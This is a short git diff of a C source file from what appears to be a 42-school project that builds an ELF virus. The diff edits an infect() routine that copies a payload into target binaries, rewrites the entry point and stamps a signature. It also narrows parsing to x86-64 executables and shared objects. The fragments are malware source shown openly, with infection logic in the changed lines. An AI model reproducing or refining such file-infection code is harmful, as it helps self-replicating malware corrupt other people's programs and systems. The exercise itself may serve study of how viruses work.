@@ -6,7 +6,7 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/21 13:56:49 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/25 12:37:20 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -65,7 +65,7 @@ bool	infect(profiling *this, const str path) {
 	ft_memcpy(data.file + data.infection_offset_file, this->start_rip, this->size);
 	
 	//	Change the entrypoint
-	data.elf->e_entry = data.infection_offset_mem;
+	data.elf->e_entry = data.infection_offset_mem + this->size - 0x1c;
 	
 	//	Copy signature
 	ft_memcpy(data.file + data.infection_offset_file + this->size + SIGNATURE_OFFSET, this->signature, SIGNATURE_LEN);
@@ -98,7 +98,8 @@ static bool	parsing(byte *file, elf_data *data) {
 	if (file[EI_CLASS] != ELFCLASS64 || file[EI_DATA] != ELFDATA2LSB)
 		return false;
 
-	if (((Elf64_Ehdr *)file)->e_machine != EM_X86_64)
+	if (((Elf64_Ehdr *)file)->e_machine != EM_X86_64 ||
+			!(((Elf64_Ehdr *)file)->e_type == ET_EXEC || ((Elf64_Ehdr *)file)->e_type == ET_DYN))
 		return false;
 
 	data->file = file;
@@ -114,7 +115,6 @@ static bool	parsing(byte *file, elf_data *data) {
 			return false;
 		}
 	}
-
 
 	return true;
 }
